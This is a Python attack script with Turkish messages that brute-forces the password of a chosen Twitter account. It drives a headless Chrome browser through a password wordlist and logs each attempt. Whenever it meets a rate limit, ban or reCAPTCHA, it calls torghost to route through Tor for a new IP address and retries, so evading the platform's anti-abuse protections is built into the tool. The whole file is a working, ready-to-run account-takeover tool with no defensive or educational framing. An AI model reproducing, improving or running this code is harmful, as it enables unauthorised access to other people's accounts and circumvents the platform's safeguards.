#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.chrome.service import Service
from clint.textui import colored
from selenium.webdriver.common.keys import Keys
import subprocess
import os
import sys
from clint.textui import colored
import time
from threading import Thread
a=subprocess.check_output(["id"])
if not "root" in a.decode():
    print(colored.red("[-]Bu Araç Root Yetkisi İstiyor! Root Olup Yeniden Çalıştırın"))
    exit()
def ip_changer():
    print(colored.red("[")+colored.green("+")+colored.red("]")+"IP Adresiniz Güvenlik Amaçlı Değiştiriliyor.")
    tor_network=["sudo xterm -e killall openvpn && sudo xterm -e killall autovpn && sudo xterm -e torghost -x && sudo xterm -e torghost -s"]
    os.system("sudo xterm -e killall xterm")
    os.system(str(tor_network[0]))
with open("Passwords/entered_passwords.txt","w") as f:
    f.write("BruterNineTeen Entered Passwords:\n----------------------------------\n")
with open("Passwords/not_entered_passwords.txt","w") as fil:
    fil.write("BruterNineTeen Not Entered Passwords:\n----------------------------------\n")
def start_insta(username):
    global driver
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('disable-infobars')
    options.add_experimental_option('prefs', {'intl.accept_languages': 'en,en_US'})
    options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36")
    loc=os.getcwd()
    serv=Service("%s/path/chromedriver"%loc)
    driver = webdriver.Chrome(options=options,service=serv)
    driver.get("https://twitter.com/login")
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/div/div/div[2]/main/div/div/form/div/div[1]/label/div/div[2]/div/input"))).send_keys(username)
def tw_brute(username,password_wordlist):
    ip_changer()
    ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
    ip_adr=ip_adr.decode()
    print(colored.red("-")*50)
    print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("IP Adresiniz Değiştirildi:")+colored.blue(str(ip_adr)))
    print(colored.red("-")*50)
    start_insta(username)
    inputed=list()
    x=0
    while(x<=len(password_wordlist)):
        try:
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/form/div/div[2]/label/div/div[2]/div/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/form/div/div[2]/label/div/div[2]/div/input'))).send_keys(password_wordlist[x])
            time.sleep(1)
            with open("Passwords/entered_passwords.txt","a+") as fi:
                fi.write("\n"+password_wordlist[x])
            try:
                captcha=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/div[1]/span'))).text
            except:
                try:
                    captcha=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[2]/div[3]/div/div[1]/div/h1'))).text
                except:
                    try:
                        captcha=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/div[1]/div[1]/span'))).text
                    except:
                        captcha=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/form/div/div/label/div/div[2]/div/input'))).click()
            if "your password was incorrect." in captcha or " email and password you entered" in captcha:
                print(colored.red("[-]Parola Değil:")+colored.magenta(password_wordlist[x]))   
            elif "We need you to wait for" in captcha or "Yikes!" in captcha or "reCAPTCHA" in captcha or "challenge" in captcha:
                if x>0:
                    x=x-1   
                print(colored.red("[")+colored.green("+")+colored.red("]")+"Bu IP Adresi Banlandı. IP Adresiniz Değiştiriliyor..")
                driver.close()
                ip_changer()
                ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
                ip_adr=ip_adr.decode()
                print(colored.red("-")*50)
                print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("IP Adresi Değiştirildi:")+colored.blue(str(ip_adr)))
                print(colored.red("-")*50)
                start_insta(username)
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/form/div/div[2]/label/div/div[2]/div/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/form/div/div[2]/label/div/div[2]/div/input'))).send_keys(password_wordlist[x])
                time.sleep(2)
                with open("Passwords/entered_passwords.txt","a+") as fi:
                    fi.write("\n"+password_wordlist[x])
            else:
                print(colored.green("[+]Parola BULUNDU!! -->")+colored.blue(password_wordlist[x]))
        except KeyboardInterrupt:
            print(colored.red("[-]CTRL+C DALGILANDI ÇIKILIYOR..."))
            break
            exit()
        except:
            try:
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div/div"))).click()
                print(colored.green("[+]Parola BULUNDU!! -->")+colored.blue(password_wordlist[x]))
                break
                exit()
            except:
                try:
                    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div/form/input[9]"))).click()
                    print(colored.green("[+]Parola BULUNDU!! -->")+colored.blue(password_wordlist[x]))
                    break
                    exit()
                except:
                    try:
                        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div/p[2]/a[2]"))).click()
                        print(colored.green("[+]Parola BULUNDU!! -->")+colored.blue(password_wordlist[x]))
                        break
                        exit()
                    except:
                        if x > 0:
                            x=x-1
                        print(colored.red("[")+colored.green("+")+colored.red("]")+"Bu IP Adresi Banlandı. IP Adresiniz Değiştiriliyor...")
                        driver.close()
                        ip_changer()
                        ip_adr=subprocess.check_output(["curl","icanhazip.com","-s"])
                        ip_adr=ip_adr.decode()
                        print(colored.red("-")*50)
                        print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("IP Adresiniz Değiştirildi:")+colored.blue(str(ip_adr)))
                        print(colored.red("-")*50)
                        start_insta(username)
                        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/form/div/div[2]/label/div/div[2]/div/input'))).send_keys(Keys.CONTROL,"a",Keys.DELETE)
                        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div/div/div[2]/main/div/div/form/div/div[2]/label/div/div[2]/div/input'))).send_keys(password_wordlist[x])
                        time.sleep(2)
                        with open("Passwords/entered_passwords.txt","a+") as fi:
                            fi.write("\n"+password_wordlist[x])
        x+=1    
    for j in password_wordlist:
        with open("Passwords/entered_passwords.txt","r") as fenerbahce:
            same=fenerbahce.readlines()
        if not j in same:
            with open("Passwords/not_entered_passwords.txt","a+") as file:
                file.write(j)
